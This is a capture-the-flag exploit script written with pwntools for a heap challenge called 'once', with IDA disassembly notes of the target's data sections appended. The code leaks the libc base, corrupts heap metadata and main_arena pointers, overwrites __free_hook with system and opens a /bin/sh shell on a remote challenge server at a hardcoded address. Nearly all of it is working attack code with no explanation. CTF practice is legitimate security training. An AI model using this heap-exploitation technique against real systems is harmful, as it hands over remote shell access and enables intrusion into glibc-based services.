# coding:utf-8
# flag:HITB{this_is_the_xxxxxxx_flag}
from pwn import *

LOCAL = 0
if LOCAL:
    libc = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
#    libc = ELF('./libc-2.23.so')
    p = process('./once')#,env={"LD_PRELOAD":"./libc-2.23.so"})
    context.log_level='debug'
else:
    libc = ELF('./libc-2.23.so')
    p=remote('47.75.189.102', 9999)

def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()

def gift():
    p.send('0\n')
    p.recvuntil('Invalid choice\n')
    base = int(p.recv(14),16) - libc.symbols['puts']
    return base

def Add():
    p.send('1\n')
    p.recvuntil('suceess')

def Edit(content):
    p.send('2\n')
    sleep(0.5)
    p.send(content)
    p.recvuntil('success')

def Exchange():
    p.send('3\n')
    p.recvuntil('success')


def Game():
    p.send('4\n')
    sleep(0.5)

def Game_read(content):
    p.send('2\n')
    sleep(0.5)
    p.send(content)
    p.recvuntil('>')

def Game_Add(sz):
    p.send('1\n')
    p.recvuntil('input size:')
    p.send(str(sz)+'\n')
    p.recvuntil('>')

def Game_end():
    p.send('4\n')
    p.recvuntil('>')

def pwnit():
    #calc libc
    base = gift()
    main_arena = 0x3C4B78 + base
    bss_start = base + 0x3C5620
    stdin_addr = base + 0x3C48E0
    free_hook_addr = base + libc.symbols['__free_hook']
    binsh_addr = base + libc.search('/bin/sh').next()

    Edit(p64(1)+p64(0x20fe1)+p64(main_arena-0x10)*2)
    Add()
#    z()
    Exchange()

    Game()
    Game_Add(400)

    payload = p64(free_hook_addr)*2+p64(bss_start)+p64(0)+p64(stdin_addr)+p64(0)*2
    payload += p64(binsh_addr)+p32(0)+p32(0x100)+p64(0)

    Game_read(payload)
    Game_end()
    Edit(p64(base+libc.symbols['system']))

    p.send('4\n')
    sleep(0.5)
    p.send('3\n')

    p.interactive()

if __name__ == "__main__":
    pwnit()

# .data:000055D844B25020 data            db    0                 ; DATA XREF: add+67↑o
# .data:000055D844B25020                                         ; exchange+47↑o ...
# .data:000055D844B25021                 db    0
# .data:000055D844B25022                 db    0
# .data:000055D844B25023                 db    0
# .data:000055D844B25024                 db    0
# .data:000055D844B25025                 db    0
# .data:000055D844B25026                 db    0
# .data:000055D844B25027                 db    0
# .data:000055D844B25028                 db    0
# .data:000055D844B25029                 db    0
# .data:000055D844B2502A                 db    0
# .data:000055D844B2502B                 db    0
# .data:000055D844B2502C                 db    0
# .data:000055D844B2502D                 db    0
# .data:000055D844B2502E                 db    0
# .data:000055D844B2502F                 db    0
# .data:000055D844B25030                 dq offset data
# .data:000055D844B25038 addr            dq offset data          ; DATA XREF: add+4D↑r


# .bss:000055D844B25040 _bss            segment para public 'BSS' use64
# .bss:000055D844B25040                 assume cs:_bss
# .bss:000055D844B25040                 ;org 55D844B25040h
# .bss:000055D844B25040                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
# .bss:000055D844B25040                 public __bss_start
# .bss:000055D844B25040 ; FILE *_bss_start
# .bss:000055D844B25040 __bss_start     dq ?                    ; DATA XREF: sub_55D844923990↑o
# .bss:000055D844B25040                                         ; sub_55D844923A60:loc_55D8449239D0↑o ...
# .bss:000055D844B25040                                         ; Alternative name is '_edata'
# .bss:000055D844B25040                                         ; stdout
# .bss:000055D844B25040                                         ; _edata
# .bss:000055D844B25040                                         ; Copy of shared data
# .bss:000055D844B25048                 align 10h
# .bss:000055D844B25050                 public stdin
# .bss:000055D844B25050 ; FILE *stdin
# .bss:000055D844B25050 stdin           dq ?                    ; DATA XREF: init_0+17↑r
# .bss:000055D844B25050                                         ; Copy of shared data
# .bss:000055D844B25058 byte_55D844B25058 db ?                  ; DATA XREF: sub_55D844923A20↑r
# .bss:000055D844B25058                                         ; sub_55D844923A20+29↑w
# .bss:000055D844B25059                 align 20h
# .bss:000055D844B25060 dword_55D844B25060 dd ?                 ; DATA XREF: exchange+17↑r
# .bss:000055D844B25060                                         ; exchange+52↑w
# .bss:000055D844B25064 is_edit         dd ?                    ; DATA XREF: edit+17↑r
# .bss:000055D844B25064                                         ; edit+45↑w
# .bss:000055D844B25068 ; void *ptr